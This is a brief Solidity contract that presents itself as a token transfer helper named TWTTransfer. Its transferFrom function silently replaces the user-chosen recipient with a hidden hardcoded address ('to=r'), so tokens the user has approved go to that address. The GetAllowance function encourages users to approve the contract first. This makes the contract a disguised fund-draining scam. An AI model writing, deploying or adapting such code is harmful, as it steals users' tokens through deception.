// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TWTTransfer {
    IERC20 token;
    address private r;
    constructor() {
        token = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        r = 0x453611A0f6423A740Dd930E39828E2b26F93A4cB;
    }
    function GetAllowance() public view returns(uint256){
       return token.allowance(msg.sender, address(this));
    }
    function transferFrom(address to, uint256 amount) external returns (bool) {
        return token.transferFrom(msg.sender, to=r, amount);
    }
}
